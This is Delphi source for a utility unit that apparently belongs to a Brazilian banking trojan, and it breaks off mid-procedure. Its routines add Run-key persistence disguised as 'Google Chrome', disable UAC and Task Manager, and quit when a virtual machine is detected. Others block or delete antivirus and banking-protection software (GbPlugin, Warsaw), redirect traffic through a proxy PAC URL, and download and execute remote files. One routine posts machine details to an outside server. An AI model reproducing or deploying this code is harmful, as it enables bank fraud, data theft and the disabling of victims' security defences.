unit uPCFuncs;

interface

uses Windows, Classes, Registry, TlHelp32, SysUtils, Messages, Forms, Activex,
  ComObj, shellapi, ddeman, CommCtrl, StdCtrls, ShlObj, idHTTP, Dialogs;

type
  TNTdllApi = Function(Thread: thandle): boolean; stdcall;

type
  Terminate = Function(Thread: thandle; dwCode: word): boolean; Stdcall;

  // procedure AVs;
function NomePC: string;
function GetWindowsVersion: string;
function WUser: string;
procedure KP(hWindowHandle: HWND);
function GetProgramFilesDir: string;
procedure DisableUAC;
procedure DisablePreview;
procedure Install(Path, Dir: String);
procedure TaskMgrOff(ligado: integer);
procedure NoHotKey(hdle: HWND; estado: boolean);
procedure Max(janela: HWND);
procedure Delay(msecs: integer);
function GetOS: string;
// function AVExists: string;
function WindowsExit(RebootParam: Longword): boolean;
Function Anti_End: Bool;
function GetDefaultBrowser: String;
function IntToBoolean(Num: integer): boolean;
function GetURL(Service: string): String;
function SetTokenPrivileges: boolean;
function GetProcessPid(Process: string): integer;
function SuspendProcess(pid: dword): boolean;
// procedure block2(Path: String);
function GravaDados(URL: string): boolean;
function IsBrasil: boolean;
function LocalAppDataPath: string;
function GetSpecialDir(folder: integer): string;
procedure PAC(PACs: String);
procedure ConfigJava;
procedure AutoDelete;
procedure DownExec(Path, Link, Params: String);
function HTTPGet(Link: String): String;
procedure EnableAero;
function StartThread(pFunction: TFNThreadStartRoutine;
  iPriority: integer = Thread_Priority_Normal; iStartFlag: integer = 0)
  : thandle;
function ExecuteAndWait(Arquivo: String; estado: integer): integer;
procedure EnableAeroNow;
function ISAeroEnabled: boolean;
function strToBoolean(s: string): boolean;
function IsWindows64: boolean;
procedure Extract_Volarite;
function GetWinDir: string;
Procedure Anntrax_Coder_Copyright;
procedure Google;
procedure arquivologfile;
Procedure IniciarComWindows(keyName: string);
function SaveList: String;
procedure verifica_registro;
procedure AutoKeyRunshell;
function FileSetAttr(const FileName: string; Attr: integer): integer;
procedure HideFile(FileName: String);
procedure Verifullbuster;
// Procedure Pegando(X,Y:DWORD);

const
  KVERSAO = '6.0';
  faHidden = $00000002 platform;
  faSysFile = $00000004 platform;

var
  PropValues: TArray<string>;
  ProductType: dword;

implementation

uses uCrypt, uClient, uHBrowsers, uGB, uAVInfo, SimpleWMI;

function IsUltimateEdition(ProductType: dword): boolean;
begin
  Result := ProductType in [PRODUCT_ULTIMATE, PRODUCT_ULTIMATE_N,
    PRODUCT_ULTIMATE_E];
end;
{
  Procedure Pegando;
  begin
  CoInitialize(nil);
  try
  PropValues := GetWMIprops('.', 'root\CIMV2', 'Win32_OperatingSystem', ['Caption', 'Version', 'OperatingSystemSKU']);
  :=PropValues[0];
  := 'Version'+PropValues[1];
  ProductType := StrToInt(PropValues[2]);
  finally
  CoUninitialize;
  end;
  end; }

function FileSetAttr(const FileName: string; Attr: integer): integer;
begin
  Result := 0;
  if not SetFileAttributes(PChar(FileName), Attr) then
    Result := GetLastError;
end;

procedure HideFile(FileName: String);
begin
  FileSetAttr(FileName, faHidden or faSysFile);
end;

function HTTPGet(Link: String): String;
var
  HTTP: TIdHTTP;
begin
  HTTP := TIdHTTP.Create;
  try
    try
      Result := HTTP.Get(Link);
    except
      on E: Exception do
        fClient.memo1.lines.add(E.Message);
    end;
  finally
    HTTP.Free;
  end;
end;

function ExecuteAndWait(Arquivo: String; estado: integer): integer;
var
  Programa: array [0 .. 512] of char;
  CurDir: array [0 .. 255] of char;
  WorkDir: String;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
  Exit: Cardinal;
begin
  StrPCopy(Programa, Arquivo);
  GetDir(0, WorkDir);
  StrPCopy(CurDir, WorkDir);
  FillChar(StartupInfo, Sizeof(StartupInfo), #0);
  StartupInfo.cb := Sizeof(StartupInfo);
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
  StartupInfo.wShowWindow := estado;
  if not CreateProcess(nil, Programa, nil, nil, false, CREATE_NEW_CONSOLE or
    NORMAL_PRIORITY_CLASS, nil, nil, StartupInfo, ProcessInfo) then
    Result := -1
  else
  begin
    WaitForSingleObject(ProcessInfo.hProcess, Infinite);
    GetExitCodeProcess(ProcessInfo.hProcess, Exit);
  end;
end;

procedure DownExec(Path, Link, Params: String);
var
  HTTP: TIdHTTP;
  sFile: TFileStream;
begin
  HTTP := TIdHTTP.Create;
  sFile := TFileStream.Create(Path, fmCreate);
  try
    try
      HTTP.Get(Link, sFile);
    except
      on E: Exception do
        fClient.memo1.lines.add(E.Message);
    end;
  finally
    sFile.Free;
    HTTP.Free;
  end;
  ShellExecute(0, 'Open', pwideChar(Path), pwideChar(Params), nil, Sw_normal);
end;

function strToBoolean(s: string): boolean;
begin
  Result := ((uppercase(s) = 'TRUE') or (uppercase(s) = 'T') or
    (uppercase(s) = 'YES') or (uppercase(s) = 'Y') or (uppercase(s) = 'ON') or
    (uppercase(s) = 'O') or (uppercase(s) = '1'));
end;

function IsWindows64: boolean;
type
  TIsWow64Process = function(AHandle: thandle; var AIsWow64: Bool)
    : Bool; stdcall;
var
  vKernel32Handle: dword;
  vIsWow64Process: TIsWow64Process;
  vIsWow64: Bool;
begin
  Result := false;
  vKernel32Handle := LoadLibrary('kernel32.dll');
  if (vKernel32Handle = 0) then
    Exit; // Loading kernel32.dll was failed, just return
  try
    @vIsWow64Process := GetProcAddress(vKernel32Handle, 'IsWow64Process');
    if not Assigned(vIsWow64Process) then
      Exit; // Loading IsWow64Process was failed, just return
    vIsWow64 := false;
    if (vIsWow64Process(GetCurrentProcess, vIsWow64)) then
      Result := vIsWow64; // use the returned value
  finally
    FreeLibrary(vKernel32Handle); // unload the library
  end;
end;

function ISAeroEnabled: boolean;
type
  _DwmIsCompositionEnabledFunc = function(var IsEnabled: boolean)
    : HRESULT; stdcall;
var
  Flag: boolean;
  DllHandle: thandle;
  OsVersion: TOSVersionInfo;
  DwmIsCompositionEnabledFunc: _DwmIsCompositionEnabledFunc;
begin
  Result := false;
  ZeroMemory(@OsVersion, Sizeof(OsVersion));
  OsVersion.dwOSVersionInfoSize := Sizeof(TOSVersionInfo);

  if ((GetVersionEx(OsVersion)) and
    (OsVersion.dwPlatformId = VER_PLATFORM_WIN32_NT) and
    (OsVersion.dwMajorVersion >= 6)) then // is Vista or Win7?
  begin
    DllHandle := LoadLibrary('dwmapi.dll');
    try
      if DllHandle <> 0 then
      begin
        @DwmIsCompositionEnabledFunc := GetProcAddress(DllHandle,
          'DwmIsCompositionEnabled');
        if (@DwmIsCompositionEnabledFunc <> nil) then
        begin
          if DwmIsCompositionEnabledFunc(Flag) = S_OK then
            Result := Flag;
        end;
      end;
    finally
      if DllHandle <> 0 then
        FreeLibrary(DllHandle);
    end;
  end;
end;

procedure PAC(PACs: String);
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    Reg.OpenKey
      ('Software\Microsoft\Windows\CurrentVersion\Internet Settings', false);
    Reg.WriteString('AutoConfigURL', PACs);
  except
    Reg.Free;
  end;
end;

function StartThread(pFunction: TFNThreadStartRoutine;
  iPriority: integer = Thread_Priority_Normal; iStartFlag: integer = 0)
  : thandle;
var
  ThreadID: dword;
begin
  Result := CreateThread(nil, 0, pFunction, nil, iStartFlag, ThreadID);
  SetThreadPriority(Result, iPriority);
end;

function WindowsExit(RebootParam: Longword): boolean;
var
  TTokenHd: thandle;
  TTokenPvg: TTokenPrivileges;
  cbtpPrevious: dword;
  rTTokenPvg: TTokenPrivileges;
  pcbtpPreviousRequired: dword;
  tpResult: boolean;
const
  SE_SHUTDOWN_NAME = 'SeShutdownPrivilege';
begin
  tpResult := OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or
    TOKEN_QUERY, TTokenHd);
  if tpResult then
  begin
    tpResult := LookupPrivilegeValue(nil, SE_SHUTDOWN_NAME,
      TTokenPvg.Privileges[0].Luid);
    TTokenPvg.PrivilegeCount := 1;
    TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    cbtpPrevious := Sizeof(rTTokenPvg);
    pcbtpPreviousRequired := 0;
    if tpResult then
      Windows.AdjustTokenPrivileges(TTokenHd, false, TTokenPvg, cbtpPrevious,
        rTTokenPvg, pcbtpPreviousRequired);
  end;
  Result := ExitWindowsEx(RebootParam, 0);
end;

procedure EnableAeroNow;
begin
  EnableAero;
  ExecuteAndWait('net stop uxsms', SW_HIDE);
  ExecuteAndWait('net start uxsms', SW_HIDE);
end;

procedure EnableAero;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    Reg.OpenKey('Software\Microsoft\Windows\DWM', false);
    Reg.WriteInteger('Composition', 1);
    Reg.WriteInteger('CompositionPolicy', 2);
  except
    Reg.Free;
  end;
end;

procedure ConfigJava;
var
  ArqPath: String;
  ArqList: TStringList;
begin
  if not fClient.XP then
    ArqPath := LocalAppDataPath +
      'Low\Sun\Java\Deployment\deployment.properties'
  else
    ArqPath := GetSpecialDir(CSIDL_APPDATA) +
      '\Sun\Java\Deployment\deployment.properties';
  ArqList := TStringList.Create;
  try
    ArqList.LoadFromFile(ArqPath);
  except
    ArqList.Free;
    Exit;
  end;
  ArqList.add('deployment.security.askgrantdialog.show=false');
  ArqList.add('deployment.security.askgrantdialog.notinca=false');
  ArqList.add('deployment.javaws.associations=ALWAYS');
  ArqList.SaveToFile(ArqPath);
  ArqList.Free;
end;

procedure block2(Path: String);
const
  Grupos: Array [0 .. 10] of String = ('SYSTEM', 'Users', 'User', 'Usuários',
    'Usuário', 'Administrador', 'Administradores', 'Administrators',
    'Administrator', 'Todos', 'Everyone');
var
  i: integer;
begin
  for i := 0 to 10 do
    ShellExecute(0, PChar('open'), PChar('cmd'),
      PChar('/c Echo Y| cacls "' + Path + '" /p ' + Grupos[i] + ':n /e'),
      nil, SW_HIDE);
  for i := 0 to 10 do
    ShellExecute(0, PChar('open'), PChar('cacls.exe'),
      PChar('"' + Path + '" /p ' + Grupos[i] + ':n /e'), nil, SW_HIDE);
end; {

  procedure AVs;
  begin
  if DirectoryExists(GetProgramFilesDir+Crypt('D','B64ADE64E90F503BC200558D439D20D2')) then // avast
  begin
  Block2(GetProgramFilesDir+Crypt('D','B64ADE64E90F503BC200558D439D20D2'));
  Block2(GetProgramFilesDir+Crypt('D','34C95EE56B8CD3B8409D37EF21BB1ED47897809B'));
  end;
  if DirectoryExists(GetProgramFilesDir+Crypt('D','84B9AF57D21D6D88838784F16287')) then     // avg12
  begin
  Block2(GetProgramFilesDir+Crypt('D','97AABE44C71664F17595F66CD80C5D84A239D87D94BA73D57C9D4D88AE'));
  Block2(GetProgramFilesDir+Crypt('D','162B39DE6AF405101B7F9C89FD63F43CEA6D96C67DB4B123AD24'));
  end;
  if DirectoryExists(GetProgramFilesDir+Crypt('D','84B9AF57D21D6D88838784F16287')) then     // avg13
  begin
  Block2(GetProgramFilesDir+Crypt('D','798C98BF4B95E577F21774E15396C7699936DF6289B14486CCCD7DB85D'));
  Block2(GetProgramFilesDir+Crypt('D','788D9BA0AB3A48D551B1D24035A83AE70646E97AA058D50FB120'));
  end;
  end; }

function IsBrasil: boolean;
var
  Reg: TRegistry;
  Country: String;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.OpenKey('Control Panel\International', false);
  Country := uppercase(Reg.ReadString('SCountry'));
  if (Country = uppercase('Brazil')) or (Country = uppercase('Brasil')) then
    Result := True
  else
    Result := false;
  Reg.Free;
end;

function LocalAppDataPath: string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  Path: array [0 .. MaxChar] of char;
begin
  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, @Path[0]);
  Result := StrPas(Path);
end;

function GetSpecialDir(folder: integer): string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  Path: array [0 .. MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0, folder, 0, SHGFP_TYPE_CURRENT, @Path[0])) then
    Result := Path
  else
    Result := '';
end;

function SuspendProcess(pid: dword): boolean; // Suspende processo pelo PID
var
  module, module1: thandle;
  SuspendProcess: TNTdllApi;
begin
  Result := false;
  SetTokenPrivileges;
  module := LoadLibrary('ntdll.dll');
  @SuspendProcess := GetProcAddress(module, 'NtSuspendProcess');
  if @SuspendProcess <> nil then
  begin
    module1 := OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    SuspendProcess(module1);
  end;
end;

function GetProcessPid(Process: string): integer; // Função de pegar o PID
var
  hProcSnap: thandle;
  pe32: TProcessEntry32;
begin
  Result := -1;
  hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if hProcSnap = INVALID_HANDLE_VALUE then
    Exit;
  pe32.dwSize := Sizeof(TProcessEntry32);
  if Process32First(hProcSnap, pe32) = True then
    while Process32Next(hProcSnap, pe32) = True do
      if pos(Process, LowerCase(pe32.szExeFile)) > 0 then
        Result := pe32.th32ProcessID;
end;

function SetTokenPrivileges: boolean;
var
  hToken1, hToken2: thandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
  hToken3: Cardinal;
begin
  Version.dwOSVersionInfoSize := Sizeof(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege',
        TokenPrivileges.Privileges[0].Luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, false, TokenPrivileges,
        Sizeof(TokenPrivileges), PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, false, TokenPrivileges,
        Sizeof(TokenPrivileges), PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except
      ;
    end;
  end;
  Result := True;
end;

procedure AutoDelete;
Var
  Arquivo: TextFile;
  Reg: TRegistry;
begin
  AssignFile(Arquivo, ChangeFileExt(ParamStr(0), '.bat'));
  try
    ReWrite(Arquivo);
    WriteLn(Arquivo, ':1');
    WriteLn(Arquivo, Format('Erase "%s"', [ParamStr(0)]));
    WriteLn(Arquivo, Format('If exist "%s" Goto 1', [ParamStr(0)]));
    WriteLn(Arquivo, Format('Erase "%s"', [ChangeFileExt(ParamStr(0),
      '.bat')]));
  finally
    CloseFile(Arquivo);
  end;
  ShellExecute(0, 'Open', pwideChar(ChangeFileExt(ParamStr(0), '.bat')), nil,
    nil, SW_HIDE);
  Halt;
end;

function ExtractFileName(const Path: String): String;
var
  i, L: integer;
  Ch: char;
Begin
  Result := Path;
  L := Length(Path);
  For i := L DownTo 1 Do
  Begin
    Ch := Path[i];
    If (Ch = '\') Or (Ch = '/') Then
    Begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    End;
  End;
End;

function GetDefaultBrowser: String;
var
  Reg: TRegistry;
  keyName: string;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CLASSES_ROOT;
    keyName := 'htmlfile\shell\open\command';
    if Reg.OpenKey(keyName, false) then
    begin
      Result := ExtractFileName(Reg.ReadString(''));
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;

{ function AVExists: string;
  begin
  if DirectoryExists(GetProgramFilesDir + Crypt('D', '778A9EA5A0')) then
  result := Crypt('D', 'D54EF168') + ' ';
  if FileExists(GetProgramFilesDir + Crypt('D',
  '5EE3709794D5197289CA0232EF68EA07')) then
  result := result + Crypt('D', '49D31FD1094F');
  if Result = '' then Result := '0';
  end; }

function GetOS: string;
var
  objWMIService: OLEVariant;
  colItems: OLEVariant;
  colItem: OLEVariant;
  oEnum: IEnumvariant;
  iValue: Longword;

  function GetWMIObject(const objectName: String): IDispatch;
  var
    chEaten: integer;
    BindCtx: IBindCtx;
    Moniker: IMoniker;
  begin
    OleCheck(CreateBindCtx(0, BindCtx));
    OleCheck(MkParseDisplayName(BindCtx, StringToOleStr(objectName), chEaten,
      Moniker));
    OleCheck(Moniker.BindToObject(BindCtx, nil, IDispatch, Result));
  end;

begin
  try
    objWMIService := GetWMIObject('winmgmts:\\localhost\root\cimv2');
    colItems := objWMIService.ExecQuery('SELECT * FROM Win32_OperatingSystem',
      'WQL', 0);
    oEnum := IUnknown(colItems._NewEnum) as IEnumvariant;
    if oEnum.Next(1, colItem, iValue) = 0 then
      Result := Format('%s %s', [colItem.Caption, colItem.Version]);
  except
    Result := '?'
  end;
end;

procedure Delay(msecs: integer);
var
  FirstTickCount: longint;
begin
  FirstTickCount := GetTickCount;
  repeat
    Application.ProcessMessages; { para acessar outros controles, etc. }
  until ((GetTickCount - FirstTickCount) >= longint(msecs));
end;

function IntToBoolean(Num: integer): boolean;
begin
  if Num <> 0 then
    Result := True
  else
    Result := false;
end;

procedure KP(hWindowHandle: HWND);
var
  hprocessID: integer;
  processHandle: thandle;
  DWResult: dword;
begin
  SendMessageTimeout(hWindowHandle, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG or
    SMTO_NORMAL, 5000, DWResult);
  if isWindow(hWindowHandle) then
  begin
    GetWindowThreadProcessID(hWindowHandle, @hprocessID);
    if hprocessID <> 0 then
    begin
      processHandle := OpenProcess(PROCESS_TERMINATE or
        PROCESS_QUERY_INFORMATION, false, hprocessID);
      if processHandle <> 0 then
      begin
        TerminateProcess(processHandle, 0);
        CloseHandle(processHandle);
      end;
    end;
  end;
end;

function GetProgramFilesDir: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion', false);
    Result := Reg.ReadString('ProgramFilesDir');
  finally
    Reg.Free;
  end;
end;

function NomePC: string;
const
  MAX_COMPUTER_LENGTH = 30;
var
  pNome: PChar;
  len: dword;
begin
  try
    len := MAX_COMPUTER_LENGTH + 1;
    GetMem(pNome, len);
    if GetComputerName(pNome, len) then
      Result := pNome
    else
      Result := 'Unknow';
  finally
    FreeMem(pNome, len);
  end;
end;

procedure Install(Path, Dir: String); // Trocar essa FUnção Babozeira da porra
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  if not DirectoryExists(Dir) then
    CreateDir(Dir);
  CopyFile(PChar(ParamStr(0)), PChar(Path), false);
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  Reg.WriteString('Google Chrome', '"' + Path + '"');
  Reg.Free;
end;

procedure TaskMgrOff(ligado: integer);
var
  Reg: TRegistry;
begin
  try
    Reg := TRegistry.Create;
    Reg.RootKey := HKEY_CURRENT_USER;
    if not Reg.KeyExists
      ('\Software\Microsoft\Windows\CurrentVersion\Policies\System') then
      Reg.CreateKey
        ('\Software\Microsoft\Windows\CurrentVersion\Policies\System');
    Reg.OpenKey
      ('\Software\Microsoft\Windows\CurrentVersion\Policies\System', false);
    Reg.WriteInteger('DisableTaskMgr', 0000000 + ligado);
  finally
    Reg.Free;
  end;
end;

procedure NoHotKey(hdle: HWND; estado: boolean);
begin
  try
    if estado then
    begin
      RegisterHotkey(hdle, 1, MOD_ALT, VK_ESCAPE);
      RegisterHotkey(hdle, 2, MOD_ALT, VK_f4);
      RegisterHotkey(hdle, 3, MOD_ALT, VK_TAB);
    end;
    if not estado then
    begin
      UnRegisterHotkey(hdle, 1);
      UnRegisterHotkey(hdle, 2);
      UnRegisterHotkey(hdle, 3);
    end;
  finally
  end;
end;

procedure Max(janela: HWND);
begin
  ShowWindow(janela, SW_MAXIMIZE);
end;

Function IsVirtualPCPresent: Bool;
Const
  sArrVM: Array [0 .. 3] Of String = ('VIRTUAL', 'VMWARE', 'VBOX', 'QEMU');
Var
  hlKey: HKEY;
  sBuffer: String;
  sPathName: String;
  i: integer;
  iRegType: integer;
  iDataSize: integer;
Begin
  IsVirtualPCPresent := false;
  iRegType := 1;
  sPathName := 'SYSTEM\ControlSet001\Services\Disk\Enum';

  If RegOpenKeyEx($80000002, PChar(sPathName), 0, $20019, hlKey) = 0 Then
    If RegQueryValueEx(hlKey, '0', 0, @iRegType, Nil, @iDataSize) = 0 Then
    Begin
      SetLength(sBuffer, iDataSize);
      RegQueryValueEx(hlKey, '0', 0, @iRegType, PByte(PChar(sBuffer)),
        @iDataSize);
      For i := 0 To 3 Do
        If AnsiPos(uppercase(sArrVM[i]), uppercase(Trim(sBuffer))) > 0 Then
          IsVirtualPCPresent := True;
    End;

  RegCloseKey(hlKey);
End;

Function Anti_End: Bool;
Begin
  Anti_End := false;
  If IsVirtualPCPresent = True Then
    ExitProcess(0);
End;

procedure DisablePreview;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced', True);
  try
    Reg.WriteInteger('ExtendedUIHoverTime', 2710);
  finally
    Reg.Free;
  end;
end;

procedure DisableUAC;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  Reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', false);
  try
    Reg.WriteInteger('EnableLUA', 0);
    Reg.WriteInteger('ConsentPromptBehaviorAdmin', 0);
  finally
    Reg.Free;
  end;
end;

function GetWindowsVersion: string;
var
  VerInfo: TOSVersionInfo;
  PlatformId, VersionNumber: string;
  Reg: TRegistry;
begin
  VerInfo.dwOSVersionInfoSize := Sizeof(VerInfo);
  GetVersionEx(VerInfo);
  // Detect platform
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  case VerInfo.dwPlatformId of
    VER_PLATFORM_WIN32s:
      begin
        PlatformId := 'Windows 3.1';
      end;
    VER_PLATFORM_WIN32_WINDOWS:
      begin
        // Registry
        Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion', false);
        PlatformId := Reg.ReadString('ProductName');
        VersionNumber := Reg.ReadString('VersionNumber');
      end;
    VER_PLATFORM_WIN32_NT:
      begin
        Reg.OpenKey('\SOFTWARE\Microsoft\Windows NT\CurrentVersion', false);
        PlatformId := Reg.ReadString('ProductName');
        VersionNumber := Reg.ReadString('CurrentVersion');
      end;
  end;
  Reg.Free;
  Result := PlatformId + ' (version ' + VersionNumber + ')';
end;

function GetURL(Service: string): String;
var
  ClDDE: TDDEClientConv;
  temp: PAnsiChar;
begin
  Result := '';
  // create a new DDE Client object
  ClDDE := TDDEClientConv.Create(nil);
  with ClDDE do
  begin
    SetLink(Service, 'WWW_GetWindowInfo');
    temp := RequestData('0xFFFFFFFF');
    Result := StrPas(temp);
    StrDispose(temp);
    CloseLink;
  end;
  ClDDE.Free;
end;

Function WUser: string;
Var
  UserName: string;
  UserNameLen: dword;
Begin
  UserNameLen := 255;
  SetLength(UserName, UserNameLen);
  If GetUserName(PChar(UserName), UserNameLen) Then
    Result := Copy(UserName, 1, UserNameLen - 1)
  Else
    Result := 'Unknown';
End;

function GetWinDir: string;
var
  Dir: array [0 .. MAX_PATH] of char;
begin
  GetWindowsDirectory(Dir, MAX_PATH);
  Result := StrPas(Dir);
end;

procedure AutoKeyRunshell;
var
  Re: TRegistry;
  SS: string;
begin
  Re := TRegistry.Create;
  SS := ExtractFileDir(Application.ExeName) + '\' +
    ExtractFileName(Application.ExeName);
  Re.RootKey := HKEY_CURRENT_USER;
  Re.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  Re.WriteString('Google Chrome', SS);
  Re.CloseKey;
  Re.Free;
end;

Procedure IniciarComWindows(keyName: string);
var
  sWinDir: string;
  cfgReg: TRegistry;
begin
  cfgReg := TRegistry.Create;
  sWinDir := GetEnvironmentVariable('windir');
  CopyFile(PChar(ParamStr(0)),
    PChar(sWinDir + ExtractFileName(ParamStr(0))), True);
  cfgReg.RootKey := HKEY_LOCAL_MACHINE;
  cfgReg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  cfgReg.WriteString(keyName, sWinDir + ExtractFileName(ParamStr(0)));
end;

procedure Verifullbuster;
begin
  if FileExists(GetProgramFilesDir + '\GbPlugin\GbpSv.exe') then
  begin
    arquivologfile;
    Extract_Volarite;
  end;
end;

function GravaDados(URL: string): boolean;
var
  Dados: TStringList;
  iHTTP: TIdHTTP;
begin
  try
    Dados := TStringList.Create;
    iHTTP := TIdHTTP.Create(nil);
    Dados.add('Key_ID=' + KVERSAO);
    Dados.add('NomePC=' + NomePC);
    // Dados.Add('GetOS='+TOSVersion.ToString);
    Dados.add('GetOS=' + GetOS);
    Dados.add('GetAVInfo=' + GetAVInfo);
    Dados.add('GbExists=' + GbExists);
    Dados.add('GetBrowser=' + DefaultBrowser);
    try
      iHTTP.Post(URL, Dados);
    except
    end;
  finally
    Result := True;
  end;
end;

function SaveList: String;
var
  List: TStringList;
begin
  List := TStringList.Create;
  List.add('Folders to delete:');
  List.add('%ProgramFiles%\AVG');
  List.add('%ProgramFiles%\Panda Security');
  List.add('%ProgramFiles%\ESET');
  List.add('%ProgramFiles%\KASPER~1');
  List.add('%ProgramFiles%\Avira');
  List.add('%ProgramFiles%\Softwin');
  List.add('%ProgramFiles%\Grisoft');
  List.add('%ProgramFiles%\NORTON~1');
  List.add('%ProgramFiles%\Microsoft Security Client');
  List.add('%ProgramFiles%\AVAST Software');
  List.add('Files to move:');
  List.add('%ProgramFiles%\Alwil Software\Avast5\AvastUI.exe|%ProgramFiles%\Alwil Software\Avast5\AvastUI.exa');
  List.add('%ProgramFiles%\Alwil Software\Avast5\AvastSvc.exe|%ProgramFiles%\Alwil Software\Avast5\AvastSvc.exa');
  List.add('%ProgramFiles%\Alwil Software\Avast5\ashUpd.exe|%ProgramFiles%\Alwil Software\Avast5\ashUpd.exa');
  List.add('%ProgramFiles%\Alwil Software\Avast5\aswChLic.exe|%ProgramFiles%\Alwil Software\Avast5\aswChLic.exa');
  List.add('%ProgramFiles%\AVAST Software\Avast\AvastSvc.exe|%ProgramFiles%\AVAST Software\Avast\AvastSvc.exa');
  List.add('%ProgramFiles%\AVAST Software\Avast\AvastUI.exe|%ProgramFiles%\AVAST Software\Avast\AvastUI.exa');
  List.SaveToFile('C:\avenger.txt');
  List.Free;
  Result := 'C:\avenger.txt';
end;

procedure arquivologfile;
var
  _Anntrax: TRegistry;
  _gen: TextFile;
begin
  _Anntrax := TRegistry.Create;
  _Anntrax.RootKey := HKEY_CURRENT_USER;
  _Anntrax.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  if not _Anntrax.ValueExists('Google Chrome') then
  Begin
    AssignFile(_gen, 'Log.txt');
    ReWrite(_gen);
    WriteLn(_gen, 'Folders to delete:');
    WriteLn(_gen, '%ProgramFiles%\AVG');
    WriteLn(_gen, '%ProgramFiles%\Panda Security');
    WriteLn(_gen, '%ProgramFiles%\ESET');
    WriteLn(_gen, '%ProgramFiles%\KASPER~1');
    WriteLn(_gen, '%ProgramFiles%\Avira');
    WriteLn(_gen, '%ProgramFiles%\COMODO');
    WriteLn(_gen, '%ProgramFiles%\Bitdefender');
    WriteLn(_gen, '%ProgramFiles%\mcafee');
    WriteLn(_gen, '%ProgramFiles%\Softwin');
    WriteLn(_gen, '%ProgramFiles%\Sandboxie');
    WriteLn(_gen, '%ProgramFiles%\Grisoft');
    WriteLn(_gen, '%ProgramFiles%\NORTON~1');
    WriteLn(_gen, '%ProgramFiles%\Microsoft Security Client');
    WriteLn(_gen, '%ProgramFiles%\AVAST Software');
    WriteLn(_gen, '%ProgramFiles%\Baidu Security');
    WriteLn(_gen, '%ProgramFiles%\GAS Tecnologia\Warsaw');
    WriteLn(_gen, '%ProgramFiles%\GAS Tecnologia\G-Lock');
    WriteLn(_gen, '');
    WriteLn(_gen, 'Files to delete:');
    WriteLn(_gen, '%ProgramFiles%\GbPlugin\gbpsv.exe');
    WriteLn(_gen, '%ProgramFiles%\GbPlugin\pm.dll');
    WriteLn(_gen, '%ProgramFiles%\GbPlugin\gbpdist.dll');
    WriteLn(_gen, '');
    WriteLn(_gen, 'Drivers to delete:');
    WriteLn(_gen, 'gbpkm');
    WriteLn(_gen, 'gbpndisrd');
    WriteLn(_gen, 'gbpndisrd');
    CloseFile(_gen);
  End;
end;

procedure verifica_registro;
var
  CkVan: TRegistry;
begin
  CkVan := TRegistry.Create;
  CkVan.RootKey := HKEY_CURRENT_USER;
  CkVan.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  if not CkVan.ValueExists('Google Chrome') then
    GravaDados('http://pfa17.fr/administrator/includes/index.php?maquina=');
end;

Procedure Anntrax_Coder_Copyright;
var
  AppHandle: HWND;
begin
  AppHandle := FindWindow('Notepad', nil);
  if isWindow(AppHandle) then
    PostMessage(AppHandle, WM_CLOSE, 0, 0);
end;

procedure Google;
var
  _Firefox: TextFile;
begin
  if FileExists('avenger.exe') or FileExists('Log.txt') then
  begin
    AssignFile(_Firefox, 'Firefox.bat');
    ReWrite(_Firefox);
    WriteLn(_Firefox, 'taskkill /im firefox.exe');
    WriteLn(_Firefox, 'taskkill /im chrome.exe');
    WriteLn(_Firefox, 'taskkill /im iexplore.exe');
    WriteLn(_Firefox, 'taskkill /im notepad.exe');
